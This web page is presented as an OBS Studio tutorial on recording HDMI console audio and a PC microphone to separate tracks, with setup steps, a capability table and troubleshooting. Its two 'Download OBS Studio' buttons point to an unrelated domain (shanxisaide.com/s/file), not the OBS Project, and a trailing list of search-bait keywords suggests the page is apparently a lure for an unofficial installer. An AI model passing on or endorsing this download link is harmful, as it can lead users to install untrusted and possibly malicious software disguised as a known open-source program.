# Record separate game and mic tracks from HDMI in OBS Studio

[![Download](https://img.shields.io/badge/Download-OBS%20Studio-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Fast HDMI Audio Tracks Brief

What is OBS Studio? An open-source recording and mixing application that can put several audio tracks in one video file.  
Why use it for HDMI Audio Tracks? Make an editor-ready console recording without sacrificing a quick-playback game-and-mic mix.  
Who needs it? PS5 and Xbox Series X or S creators who want to adjust narration after the session.  
Does it support separate game and microphone tracks? Yes, map them in the mixer and enable their track numbers in the recording output.  

## HDMI Audio Tracks Overview

This independent guide follows a cabled path from a console through a compatible capture card to a Windows PC. HDMI carries game audio to the card, while a mic connected to the PC supplies narration. If the voice is already mixed into the card feed, track assignment alone cannot separate it again.

Build a full mix for viewing and two isolated tracks for editing. In a short test, make a recognizable console menu sound with the microphone quiet, then mute the game source and say a cue into the mic. Inspect the three tracks separately so a player that defaults to the full mix cannot hide a missing isolated track.

The recorder and the capture hardware are separate components. When reading reports, look for your card's Windows driver and the editor's handling of multitrack media rather than judging by picture quality alone. A card utility may suit a quick single-mix clip; verify that it offers independent tracks before using it for an edit that requires them.

## OBS Studio Capability Matrix

| Function | Role in workflow |
| --- | --- |
| Video Capture Device | Receives the console feed from the selected HDMI card. |
| Audio Output Mode | Capture audio only keeps the card sound on its source rather than sending it through desktop playback. |
| Audio Input Capture | Names the PC microphone explicitly so it can be routed on its own. |
| Mixer meters | Let you identify the channel that responds to a console sound or spoken cue. |
| Advanced Audio Properties | Sends each source to the combined track and its dedicated track. |
| Advanced recording output | Selects which mapped tracks the file actually carries. |
| MKV recording | Reduces the risk that an interrupted take becomes completely unusable. |
| Remux Recordings | Changes the container when the editor accepts MP4 but rejects MKV. |

Assign the HDMI source to tracks 1 and 2, and the PC microphone to tracks 1 and 3. Track 1 should be ready to listen to on its own; use tracks 2 and 3 instead of track 1 when rebuilding the mix in an editor.

## Getting Started Playbook

Connect the console to the card's HDMI input and the mic to the PC. In Sources, add Video Capture Device, choose the card, and use Capture audio only under Audio Output Mode if that option is available. Add the mic as Audio Input Capture, make a sound on each device, and confirm the two expected meters respond independently. If Desktop Audio or a global Mic/Aux entry repeats either sound, disable that duplicate in Settings → Audio.

Open Advanced Audio Properties from the Edit menu and assign HDMI to 1 and 2 and Mic to 1 and 3. In Settings → Output, choose Advanced for Output Mode, open Recording, select MKV, and enable tracks 1, 2, and 3. Record two isolated cues followed by both sources together, then import the file or switch tracks in a compatible player to confirm each cue lands where intended. If the editor needs MP4, use File → Remux Recordings and verify all three tracks after import.

## Everyday Use

Name the mixer channels HDMI Game and PC Mic so you can spot a wrong input before a long take. You can use the app for local files with no login or streaming key. If you add monitoring or other audio features later, listen to a fresh sample for duplication and check spoken peaks for clipping. Hand the editor a simple note identifying the reference mix and the two isolated tracks.

## Practical Scenarios

Scenario A - Xbox headset check: If the card gets picture but no sound, verify the console still sends game audio over HDMI and test with Stereo uncompressed.  
Scenario B - PS5 game commentary: Keep the PC mic off the HDMI feed so lowering the voice in the edit does not lower game effects.  
Scenario C - Quick review copy: Listen to track 1 for the complete mix without enabling any of the isolated tracks.  
Scenario D - Timeline handoff: Label tracks 2 and 3 in the editor and mute the reference mix before balancing them.  

## System Requirements

| Item | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10 or 11 for the OBS Project's Windows release. | Windows 11 with a supported capture-card driver and editing software. |
| CPU | Capacity varies with capture resolution, encoder and frame rate. | Enough headroom to hold the chosen HDMI capture mode in a representative test file. |
| RAM | No OBS Project baseline figure for this multitrack workflow. | Practical: 16 GB if the editor or media inspection tools are also open. |
| Storage | Writable recording path with space for video and all selected tracks. | SSD capacity for original MKV files and separate remuxed copies. |
| Graphics | DirectX 10.1-capable graphics per the OBS Project's Windows requirements. | A tested hardware encoder for long HDMI sessions if CPU encoding proves slow. |
| Other | DirectShow-compatible card on Windows, a console HDMI feed and a PC-connected microphone. | Play display on passthrough when available, plus headphones to limit mic bleed. |

## Download OBS Studio

Open the download page and take the Windows installer for your machine. Check the file type, then confirm your capture card driver separately.

[![Download](https://img.shields.io/badge/Download-OBS%20Studio-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Troubleshooting Common Issues

Install issues? If the recorder runs but the card is absent, first confirm Windows detects it and its driver supports DirectShow.  
Performance problems? If picture skips while both meters behave normally, test a lower supported card mode and inspect a new recording.  
Edition differences? Recording tracks do not require an unlock key; verify track support in the editor you intend to use.  
Compatibility? A clip that plays only one track may be normal in a player, but an editor must expose the isolated audio before handoff.  
Update failures? Retain your working profile and validate the card and all three tracks again after installing from the official release channel.  

## Related Search Terms

OBS Studio, OBS Studio software, OBS Studio download, OBS Studio features, OBS Studio open source, OBS Studio reviews, OBS Studio app, OBS Studio alternatives, OBS Studio for Windows, OBS Studio latest version, OBS Studio HDMI audio tracks, separate console game and mic, OBS Studio multitrack recording, OBS Studio track 1 mix, PS5 capture card commentary, Xbox Series X HDMI game audio, OBS Studio Capture audio only, MKV multitrack remux, check audio tracks in editor, gta 6 separate audio tracks, gta 6 upload bitrate
